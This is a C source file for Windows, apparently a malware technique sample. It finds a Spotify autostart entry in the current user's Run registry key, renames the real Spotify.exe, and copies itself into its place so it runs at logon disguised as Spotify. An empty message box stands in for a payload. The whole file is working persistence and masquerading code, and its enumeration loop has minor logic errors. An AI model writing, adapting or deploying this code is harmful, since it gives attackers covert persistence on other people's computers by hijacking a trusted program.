#include <windows.h>
#include <stdio.h>

#define WCHAR_MAXPATH (MAX_PATH * sizeof(WCHAR))


DWORD MasqueradeSpotifyKey(VOID);


int main(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	WCHAR wModulePath[WCHAR_MAXPATH] = { 0 };

	if (GetModuleFileNameW(NULL, wModulePath, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	if (wcsstr(wModulePath, L"Spotify") == NULL)
	{
		if (MasqueradeSpotifyKey() != ERROR_SUCCESS)
			goto FAILURE;
	}
	else
		MessageBoxA(NULL, "", "", MB_OK);

	return ERROR_SUCCESS;

FAILURE:

	dwError = GetLastError();

	return dwError;
}

DWORD MasqueradeSpotifyKey(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	WCHAR wModulePath[WCHAR_MAXPATH] = { 0 }, wNewPath[WCHAR_MAXPATH] = { 0 };
	WCHAR wRegistryPath[WCHAR_MAXPATH] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey = NULL, hHive = HKEY_CURRENT_USER;
	BOOL bFlag = FALSE;

	dwError = (LRESULT)RegOpenKeyExW(hHive, wRegistryPath, 0, KEY_ALL_ACCESS, &hKey);
	if (dwError != ERROR_SUCCESS)
		goto FAILURE;

	for (; dwError < 256; dwError++)
	{
		DWORD dwReturn = 0, lpType = 0, dwValueSize = WCHAR_MAXPATH, dwDataSize = WCHAR_MAXPATH;
		BYTE lpData[WCHAR_MAXPATH] = { 0 };
		WCHAR wString[WCHAR_MAXPATH] = { 0 };
		WCHAR lpValue[WCHAR_MAXPATH] = { 0 };

		dwReturn = (LSTATUS)RegEnumValueW(hKey, dwError, lpValue, &dwValueSize, NULL, &lpType, lpData, &dwDataSize);
		if (dwReturn != ERROR_SUCCESS && dwError != ERROR_NO_MORE_ITEMS)
			goto FAILURE;

		if (lpType != REG_SZ)
			continue;

		swprintf(wString, L"%ws", lpData);

		if (wcsstr(wString, L"Spotify") != NULL)
		{
			bFlag = TRUE;
			break;
		}
	}

	if (!bFlag)
	{
		SetLastError(ERROR_FILE_NOT_FOUND);
		goto FAILURE;
	}

	if (GetEnvironmentVariableW(L"APPDATA", wModulePath, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	wcscat(wModulePath, L"\\Spotify\\Spotify.exe");

	if (GetEnvironmentVariableW(L"APPDATA", wNewPath, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	wcscat(wNewPath, L"\\Spotify\\RealSpotify.exe");

	if (!MoveFile(wModulePath, wNewPath))
		goto FAILURE;

	ZeroMemory(wModulePath, WCHAR_MAXPATH); ZeroMemory(wNewPath, WCHAR_MAXPATH);

	if (GetModuleFileNameW(NULL, wModulePath, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	if (GetEnvironmentVariableW(L"APPDATA", wNewPath, WCHAR_MAXPATH) == 0)
		goto FAILURE;

	wcscat(wNewPath, L"\\Spotify\\Spotify.exe");

	if (!CopyFile(wModulePath, wNewPath, TRUE))
		goto FAILURE;

	if (hKey)
		RegCloseKey(hKey);

	return ERROR_SUCCESS;

FAILURE:

	dwError = GetLastError();

	if (hKey)
		RegCloseKey(hKey);

	return dwError;
}